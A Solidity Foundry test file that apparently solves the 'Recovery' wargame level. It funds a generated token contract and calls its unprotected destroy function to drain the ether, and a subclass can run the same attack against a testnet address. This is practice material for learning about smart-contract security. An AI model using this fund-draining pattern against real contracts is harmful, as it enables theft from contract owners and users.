// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/17_Recovery.sol";

contract ContractTest is Test {

    SimpleToken token;

    receive() payable external {}

    function setUp() public {
        Recovery recovery = new Recovery();
        vm.deal(address(this), 0.001 ether);
        token = recovery.generateToken("recovery", 1e18);
        (bool result, ) = address(token).call{value: 0.001 ether}("");
        require(result, "call failed");
    }

    function testAttack() public {
        _attack();
    }

    function _attack() internal {
        assert(address(token).balance != 0);
 
        token.destroy(payable(address(this)));

        assert(address(token).balance == 0);
    }
}

contract ContractTestnet is ContractTest {
    function attack(address target) external {
        token = SimpleToken(payable(target));
        _attack();
    }
}